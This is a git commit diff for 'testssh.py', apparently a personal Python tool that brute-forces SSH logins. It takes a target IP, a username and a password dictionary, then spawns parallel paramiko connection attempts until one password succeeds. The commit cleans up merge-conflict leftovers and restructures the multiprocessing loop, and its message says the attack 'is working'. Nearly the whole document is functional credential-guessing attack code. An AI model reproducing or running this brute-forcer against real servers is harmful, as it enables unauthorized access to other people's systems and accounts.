f4258e83284ceba88be407d8ced3ec377cbed942
root <root@localhost.localdomain>
2019-07-17 11:27:46 -0400

    ssh brute force is working and looks clean

--- testssh.py
+++ testssh.py
@@ -7,44 +7,74 @@ from net_tools import get_ping
 
 def get_arguments():
     parser = optparse.OptionParser()
-    parser.add_option("-t", "--target", dest="target", help="IP of the server you want to brute force")
-    parser.add_option("-u", "--user", dest="user", help="user name on the server")
-    #parser.add_option("-p", "--protocol", dest="protocol", help="Protocol you want to use (SSH, FTP...)")
+    parser.add_option("-t", "--target", dest="target", \
+            help="IP of the server you want to brute force")
+    parser.add_option("-u", "--user", dest="user", \
+            help="user name on the server")
+    parser.add_option("-j", "--processes", dest="num_processes", \
+            help="number of processes to launch in parallel", default= mp.cpu_count())
+    parser.add_option("-p", "--protocol", dest="protocol", \
+            help="Protocol you want to use (SSH, FTP...)", default='ssh')
+    parser.add_option("-P", "--port", dest="port", \
+            help="Port on which you want to run the attack", default=24)
+    parser.add_option("-f", "--file", dest="password_file", \
+            help="Dictionnary where the list of password is stored")
+
     (options, arguments) = parser.parse_args()
     if not options.target:
         parser.error("[-] Please specify an IP address --help for more info")
     elif not options.user:
         parser.error("[-] Please specify a username, use --help for more info")
-    #elif not options.protocol:
-    #    parser.error("[-] Please specify a protocol, use --help for more info")
+    elif not options.password_file:
+        parser.error("[-] Please specify a dictionnary file, use --help for more info")
     return options 
 
-#def ssh_attack(user,address,password):
-def ssh_attack(user,address,password,event,q,i, found_password):
-    if not event.is_set():
-        print(i)
-        i.value+=1
-        print('Testing password: ' + password)
-        try :
-            ssh.connect(address, username=user, password=password)
-            print('found')
-            q.put(password)
-            found_password.value=password
-            print(password)
-            event.set()
-            return True
+def print_attack(user, host, protocol, port):
+    print("===================================================")
+    print("Launching a brute force attack on")
+    print("User: " + str(user))
+    print("Host: " + str(host))
+    print("port: " + str(port))
+    print("protocol: " +str(protocol))
+    print("===================================================")
 
-        except paramiko.ssh_exception.AuthenticationException as e :
-            print(e)
-            return False
+def ssh_attack(user, address, password, queue, index, found_password):
+    index.value+=1
+    print('Testing password: ' + password + "\t\t #" + str(index.value))
+    try :
+        ssh.connect(address, username=user, password=password)
+        queue.put(password)
+        found_password.value=password
+        return True
 
-        except paramiko.ssh_exception.NoValidConnectionsError as e :
-            print(e)
-            return False
+    except paramiko.ssh_exception.AuthenticationException as e :
+        return False
 
+    except paramiko.ssh_exception.NoValidConnectionsError as e :
+        return False
+
+
+def file2list(file_to_convert):
+    with open(file_to_convert,'r') as file_list:
+        #get the password file into a list, removing \n characteres
+       password_list = [i.strip() for i in file_list.readlines()]
+       return password_list 
 
 if __name__ == '__main__':
+
+    #retrieving options
     options = get_arguments()
+    
+    user = options.user
+    target = options.target
+    port = options.port
+    protocol = options.protocol
+    password_file = options.password_file
+    num_processes=int(options.num_processes)
+
+    #printer start-up baneer
+    print_attack(user, target, protocol, port)
+
     print("[+]Preparing brute force on server at IP "+ options.target)
 
     #Checking if the server can be pinged
@@ -62,102 +92,48 @@ if __name__ == '__main__':
     #openning password dictionnary
     f = open('pass.txt','r')
 
-    ################################
-    #Preparing the multiprocessing
-    #Working with pool, because you cannot set the number of process with the process class
-
-    #Preparing the pool
-    pool = mp.Pool(processes=8)
-
-    # Preparing the array to return the password value
-
     manager = mp.Manager()
     queue = manager.Queue() #This is needed to retrieve the final password
-    event = manager.Event() #This is needed to stop the processing when password is found
     t1 = time.time()
-<<<<<<< HEAD
-    queue.put(0)
-    #creating a lock for debugging purpose
-    lock = Lock()
+
     #Create a value that can be shared between processes
     index=manager.Value('i',0) 
 
     #Create a value to store the final password if found
     found_password=manager.Value('s','') 
 
-#    #start looping over the passwords in the file
-#    with open('pass.txt','r') as file_list:
-#        for password in file_list:
-#            if password.strip() == "" : continue
-#            password = password.strip()
-#            worker = pool.apply_async(ssh_attack, args=(options.user, options.target, password, event,queue,i))
-#            #time.sleep(0.1)
-#    print("The password is " + queue.get())
-#    print('Code executed in: '+ str(time.time() - t1))
-#    exit(0)
-=======
+    #getting the password file into list
+    password_list = file2list(password_file)
+    process_list =[]
 
-    '''For Asynchronous'''
-    #with open('rockyou.txt','r',10000) as f:
-    i=0
-    with open('pass.txt','r') as f:
-        for x in f:
-            x = x.strip()
-            worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue,i))
-            if x.strip() == "" : continue
+    #loop over the passwords in the list
+    while password_list:
+        #retrieve the num_processes first passwords
+        temp_password_list = password_list[:num_processes]
 
-    print("The password is " + queue.get())
-    print('Code executed in: '+ str(time.time() - t1))
-    exit(0)
-#
-#Also check here for implementation of multiproc with feeding proc on the fly 
-#https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/brute_http_basic.py
+        #storing all the multiprocess obj in a list
+        for i in range(0,num_processes):
+            process_list.append(mp.Process(target=ssh_attack, \
+                    args=(options.user, options.target, temp_password_list[i],\
+                    queue, index, found_password)) )
 
-##############################3
-##Working with process
-#    for password in pass_list:
-#       p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,array,q))
-#       p.start()
->>>>>>> 9ce8074e0f442b123f0a7b20511c3168e1abe2f8
-#
-##############################3
-#Working with process
-#    for password in pass_list:
-    num_process=8
-    with open('pass.txt','r') as file_list:
-       line = 0
-       password_list = [i.strip() for i in file_list.readlines()]
-       process_list =[]
-       while password_list:
-           temp_list = password_list[:num_process]
-           print len(temp_list)
-           for i in range(0,num_process):
-               process_list.append(mp.Process(target=ssh_attack, \
-                       args=(options.user, options.target, temp_list[i], event,queue, index, found_password)) )
-               process_list[-1].start()
-           print temp_list
-          # p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,queue, i))
-           for i in range(0,num_process):
-               process_list[i].join()
+            #starting the last process added
+            process_list[-1].start()
 
-           #reset the list to feed to the process and update the password list
-           del password_list[:num_process]
-           process_list =[]
-           print("qsize"+str(queue.qsize()))
+        #joining the processes
+        for i in range(0,num_processes):
+            process_list[i].join()
 
-           if queue.qsize()>=2:
-               print("Oh yeah baby, we found it! The password is " + str(found_password.value))
-               break 
+        #reset the list to feed to the process and update the password list
+        del password_list[:num_processes]
+        process_list =[]
 
+        #if the password has been found
+        if queue.qsize()>=1:
+            print("Oh yeah baby, we found it! The password is " + str(found_password.value))
+            break 
+
+        if len(password_list)==0:
+            print("Sorry, the password could not be found!")
 
     print("We are done here!")    
-               #queue.get()
-               #print("Oh yeah baby, we found it!")
-   #    for password in file_list:
-   #        if password.strip() == "" : continue
-   #        password = password.strip()
-   #        p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,queue, i))
-   #        p.start()
-   #        p.join()
-   # print("The password is " + q.get())
-   # print(array[:])
